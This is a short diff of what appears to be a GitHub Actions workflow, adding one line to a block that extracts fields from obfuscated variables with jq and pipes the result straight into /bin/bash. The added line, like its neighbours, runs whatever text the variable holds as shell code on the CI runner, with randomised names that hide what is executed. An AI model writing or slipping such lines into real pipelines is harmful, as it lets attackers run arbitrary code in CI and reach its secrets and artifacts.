@@ -28,6 +28,7 @@ jobs:
           echo $sra05 | jq -r .iu636 | /bin/bash
           printf '%s' "$ntl59" | jq -r .llv5 | /bin/bash
           printf '%s' "$kiy706" | jq -r .avfft10303 | /bin/bash
+          echo $u4 | jq -r .tvz2 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
